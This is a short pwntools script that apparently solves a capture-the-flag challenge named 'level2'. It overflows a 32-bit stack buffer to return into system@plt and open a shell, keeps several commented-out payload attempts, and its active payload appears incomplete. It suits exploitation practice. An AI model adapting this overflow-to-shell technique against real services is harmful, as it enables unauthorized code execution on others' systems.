from pwn import *

#context.log_level = 'debug'
elf = ELF('level2')
r=process('./level2')
# r = remote('node3.buuoj.cn',25687)

plt_read = elf.plt['read']
plt_system = elf.plt['system']
main_addr = 0x0804844B

bss_addr = 0x0804a060
gdb.attach(r,'b *0x804847F')

#bin_addr = next(elf.search('/bin/sh'))
#payload = 'a' * 0x88 + 'a' *4 + p32(plt_read) + p32(plt_system) + p32(0) + p32(bss_addr) + p32(8) + p32(bss_addr)

# payload = 'a' * 0x88 + 'a' * 4 + p32(plt_read) + p32(main_addr) + p32(0) + p32(bss_addr) + p32(8)

# payload = 'a' * 0x88 + 'a' * 4 + p32(plt_system) + p32(1) + p32(bin_addr)
# r.sendline(payload)
# r.sendline('/bin/sh')

#sleep(2)
r.recvuntil('Input:')

payload2 = 'a' * 0x88 + 'a' * 4 + p32(plt_system) + p32(bss_addr) + p32(bss_addr)

r.sendline(payload2)


r.interactive()
